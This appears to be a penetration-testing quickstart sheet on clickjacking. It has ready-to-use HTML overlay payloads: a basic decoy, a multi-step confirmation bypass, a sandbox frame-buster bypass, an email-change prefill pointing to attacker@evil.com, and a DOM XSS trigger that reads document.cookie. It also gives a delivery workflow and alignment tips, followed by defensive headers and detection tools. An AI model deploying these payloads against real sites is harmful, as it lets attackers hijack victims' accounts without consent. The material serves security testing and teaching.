# Clickjacking Quickstart

UI redressing — trick authenticated user into clicking hidden iframe content via overlaid decoy. CSRF tokens DO NOT prevent it.

## Vulnerability check

```bash
curl -I https://target.com | grep -i "x-frame-options\|content-security-policy"
echo '<iframe src="https://target.com/account"></iframe>' > test.html && open test.html
```
Vulnerable when no `X-Frame-Options: DENY|SAMEORIGIN` and no `frame-ancestors`, AND page renders in iframe.

## Basic exploit

```html
<style>
  iframe { position:relative; width:500px; height:700px; opacity:0.1; z-index:2; }
  div    { position:absolute; top:300px; left:60px; z-index:1; }
</style>
<div>Click me</div>
<iframe src="https://target.com/account"></iframe>
```

Workflow: opacity 0.1 → load → hover decoy until cursor changes → tweak top/left → set opacity to 0.0001 → deliver.

## Common scenarios

### Account deletion / email change (CSRF-protected action)
Standard overlay; position top:300, left:60.

### Form prepopulation
```html
<iframe src="https://target.com/account?email=attacker@evil.com"></iframe>
```
Position top:400, left:80.

### Frame-buster bypass
```html
<iframe sandbox="allow-forms" src="https://target.com/account?email=attacker@evil.com"></iframe>
```
`allow-forms` blocks scripts (frame buster) but lets forms submit.

### Multi-step (confirmation dialog)
```html
<style>
  iframe { position:relative; width:500px; height:700px; opacity:0.0001; z-index:2; }
  .firstClick  { position:absolute; top:330px; left:50px; z-index:1; }
  .secondClick { position:absolute; top:285px; left:225px; z-index:1; }
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://target.com/account"></iframe>
```

### DOM XSS trigger via clickjacking
```html
<iframe src="https://target.com/feedback?name=<img src=x onerror=alert(document.cookie)>"></iframe>
```
Decoy aligned to submit button (top:600, left:80).

## CSS properties

```css
iframe { position:relative; opacity:0.0001 /* not 0! */; z-index:2; width:500px; height:700px; }
.decoy { position:absolute; top:300px; left:60px; z-index:1; }
```

## Sandbox values

| Value | Behaviour | Bypass use |
|-------|-----------|------------|
| `sandbox=""` | max restrictions, blocks forms | no |
| `sandbox="allow-forms"` | forms allowed, scripts blocked | YES |
| `sandbox="allow-scripts"` | scripts run (frame buster fires) | no |
| `sandbox="allow-top-navigation"` | top-nav allowed | no (frame buster) |
| `sandbox="allow-same-origin"` | same-origin treatment | dangerous |

## Defense

```http
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none';
Set-Cookie: session=...; SameSite=Strict; Secure; HttpOnly
```

Express: `res.setHeader('X-Frame-Options','DENY'); res.setHeader('Content-Security-Policy',"frame-ancestors 'none';")`.
Flask: `response.headers['X-Frame-Options']='DENY'; response.headers['Content-Security-Policy']="frame-ancestors 'none';"`.
Apache: `Header always set X-Frame-Options "DENY"; Header always set Content-Security-Policy "frame-ancestors 'none';"`.
Nginx: `add_header X-Frame-Options "DENY" always; add_header Content-Security-Policy "frame-ancestors 'none';" always;`.

## Tools

- **Burp Clickbandit**: Burp menu → Clickbandit → copy script → paste in DevTools console on target → record actions → save HTML.
- **OWASP ZAP**: Active Scan flags Clickjacking (Medium).
- **Manual frame check (DevTools console)**:
  ```javascript
  if (window.self !== window.top) console.log("Page is framed");
  ```

## Common mistakes

| Mistake | Fix |
|---------|-----|
| `opacity: 0` | non-interactive — use `0.0001` |
| Decoy z-index above iframe | iframe needs higher z-index |
| No `position:` | elements won't align — use `relative`/`absolute` |
| Visible iframe in delivery | reset `opacity:0.0001` after alignment |
| Frame buster blocks load | add `sandbox="allow-forms"` |

## Defense priorities

1. `X-Frame-Options: DENY` (or SAMEORIGIN if framing required)
2. CSP `frame-ancestors 'none'` (or `'self'`)
3. `SameSite=Strict` session cookie
4. Re-auth for sensitive actions
5. CSRF tokens (defense in depth)
6. Don't rely on JS frame busters — easily bypassed

## One-liner header check

```bash
python3 -c "import requests; r=requests.get('https://target.com'); print('XFO:', r.headers.get('X-Frame-Options','MISSING')); print('CSP:', r.headers.get('Content-Security-Policy','MISSING'))"
```

## Resources

- [OWASP Clickjacking](https://owasp.org/www-community/attacks/Clickjacking)
- [OWASP Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)
- [Burp Clickbandit](https://portswigger.net/burp/documentation/desktop/tools/clickbandit)
- Full reference: `clickjacking-cheat-sheet.md`
